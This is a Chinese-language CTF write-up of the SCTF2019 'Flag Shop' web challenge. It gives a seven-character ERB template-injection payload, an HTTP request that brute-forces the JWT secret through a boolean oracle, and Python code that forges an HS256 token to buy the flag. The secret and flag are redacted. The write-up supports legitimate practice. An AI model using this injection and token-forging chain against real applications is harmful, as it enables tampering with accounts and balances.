---
title: SCTF2019 - Web - Flag Shop
date: 2026-11-14 18:21:00
categories:
  - CTF
  - SCTF2019
  - Web
tags:
  - ERB模板注入
  - JWT伪造
  - Ruby全局变量
  - 布尔盲注
cover: /img/cover/silver-hair-blue-eyes-girl.jpg
description: SCTF2019 Web 题 Flag Shop 基于 Ruby 框架，考模板注入与令牌密钥爆破。工作路由把名字前七字符拼进模板渲染，用七字符标签泄露全局变量，借布尔反馈逐字符爆破密钥，再伪造令牌改大余额购买，答案藏在令牌载荷里。
keywords:
  - Flag Shop
  - ERB注入
  - JWT伪造
  - HS256
  - 布尔爆破
ai: >-
  本题是 SCTF2019 的 Ruby 应用而非 Flask，源码见公开题解仓库。认证接口发放签名令牌，载荷含用户与余额，初始余额很小而答案标价极大，必须把余额改大，但签名依赖未知密钥。真正入口是工作路由：它把名字参数的前七字符直接拼进模板渲染，构成模板注入，七字符限制下恰好能泄露全局变量即最近一次正则匹配结果。配合服务端用密钥子串做匹配的布尔反馈，可逐字符爆破出长签名密钥。拿到密钥后伪造大余额令牌调购买接口成功，响应新令牌的载荷是数组，第三个元素带着答案。注意该数组不是标准对象，需直接解码读取，最终拿到脱敏后的 flag。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | SCTF2019 |
| 方向 | Web |
| 难度 | 源 wp 未标注（Unknown） |
| 环境 | 授权靶场（已脱敏） |
| 应用 | Ruby Sinatra（非 Flask），源码仓库 `ev0A/SCTF2019-Flag-Shop`，主文件 `Docker/app/app/app.rb` |

> 题目及练习场实例标识已按要求删除；靶场相关信息统一记为「授权靶场（已脱敏）」。

## 信息收集

- 这是 Ruby Sinatra 应用，主逻辑在 `app.rb`。
- `/api/auth` 发放 HS256 JWT，payload 形如 `{"uid": "...", "jkl": 20}`。
- flag 价格是 `10**27`，远大于初始 `jkl=20`，需要把 `jkl` 改大才能购买。
- 但 JWT 用 `ENV["SECRET"]` 签名，SECRET 未知，无法直接伪造。

## 漏洞分析

### 漏洞类型

- ERB 模板注入（SSTI）
- JWT 伪造（HS256 密钥爆破）

### 关键漏洞在 `/work` 路由

```ruby
if params[:do] == "#{params[:name][0,7]} is working" then
  ...
  ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result
end
```

- `name` 参数只取前 7 字符 `params[:name][0,7]`，直接拼进 ERB 模板渲染 → **ERB 模板注入**。
- 7 字符限制下，`<%=$&%>` 恰好 7 字符，可泄露 Ruby 全局变量 `$&`（最后一次正则匹配结果）。

### SECRET 泄露逻辑

```ruby
if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
```

- `params[:SECRET].match(/[0-9a-z]+/)` 提取 SECRET 参数中的字母数字串。
- `ENV["SECRET"].match(该串)` 在真实 SECRET 中查找该子串，匹配成功则 `$&` = 该子串，失败则 `$&` 为空。
- 响应 `alert('<候选串> working successfully!')` 即是一个布尔反馈：候选串是 SECRET 的连续子串时回显该串，否则为空。据此可逐字符爆破。

## 利用过程

### 第一步：爆破 ENV["SECRET"]

利用 `$&` 的布尔反馈，逐字符爆破 SECRET：

```http
GET /work?SECRET=<候选串>&name=<%25=$%26%25>&do=<%25=$%26%25>%20is%20working HTTP/1.1
Host: target:8080
```

- `name=<%25=$%26%25>` URL 解码后是 `<%=$&%>`（7 字符）。
- `do=<%25=$%26%25> is working` 解码后是 `<%=$&%> is working`，满足 `do == name[0,7] + " is working"`。
- 响应 `alert('<候选串> working successfully!')` 表示候选串是 SECRET 的连续子串。

爆破结果：SECRET 是 **128 字符**（`SecureRandom.hex(64)`）。出于密钥不入文的脱敏要求，此处不记录该签名密钥的字面值，仅说明「爆破得到 128 字符十六进制密钥」这一事实，复现时以本地爆破结果为准。

### 第二步：伪造 JWT 购买 flag

用爆破出的 SECRET 伪造 HS256 JWT，把 `jkl` 改为 `10**30`：

```python
token = jwt.encode({"uid": uid, "jkl": 10**30}, secret, algorithm="HS256")
r = requests.post(host + "/shop", headers={"Cookie": "auth=" + token})
```

响应：

```http
HTTP/1.1 200 OK
Set-Cookie: auth=<新JWT>; ...

{"title":"success","message":"jkl is good thing"}
```

新 JWT 的 payload 是一个**数组** `[uid, jkl, {"flag": "..."}]`，第三个元素含 flag；因为它不是标准 JSON 对象，`jwt.decode` 会报 `must be a json object`，需 base64 解码 payload 直接读取。

## 完整 EXP

本题 `payload_abs` 为空，以下为源 wp 记录的复现脚本说明（脚本本体在同目录 `_flagshop/` 归档）：

```bash
# _flagshop/brute2.py  —— 爆破 SECRET（结果写入 secret.txt）
# _flagshop/buy3.py    —— 伪造 JWT 购买 flag
# _flagshop/getflag.py —— 解码响应 cookie 提取 flag
```

```python
# 伪造 JWT 购买 flag 的核心逻辑
import jwt, requests, base64, json

token = jwt.encode({"uid": uid, "jkl": 10**30}, secret, algorithm="HS256")
r = requests.post(host + "/shop", headers={"Cookie": "auth=" + token})
new_token = r.headers["Set-Cookie"]  # 取出新 auth cookie
payload_b64 = new_token.split("auth=")[1].split(";")[0].split(".")[1]
payload_b64 += "=" * (-len(payload_b64) % 4)
data = json.loads(base64.b64decode(payload_b64))
print(data[2]["flag"])  # flag 在数组第三个元素
```

## Flag

`flag{xxxx}`（真实值已脱敏）。flag 位于 `/shop` 成功后响应 `Set-Cookie` 的新 JWT payload 数组里，需 base64 解码读取。

## 踩坑与总结

1. `/work` 路由 `name[0,7]` 拼入 ERB → 模板注入，是整条链的入口。
2. 7 字符限制下 `<%=$&%>` 泄露 Ruby 全局变量 `$&`，把「子串是否命中」转成可观测的布尔反馈。
3. 通过 `ENV["SECRET"].match(候选)` 的布尔反馈逐字符爆破 128 字符 SECRET，属于典型的布尔盲注思路。
4. 用 SECRET 伪造 JWT，改大 `jkl` 购买 flag，flag 在响应 Set-Cookie 的 JWT payload 数组里。
5. **坑点**：新 JWT 的 payload 是数组而非对象，`jwt.decode` 会报错，必须自己 base64 解码 payload。
6. 签名密钥属于敏感凭据，本文按要求不记录其字面值，只保留爆破方法与结论。

> 仅记录授权靶场环境下的研究；EXP 脚本归档见本地 WP 目录。
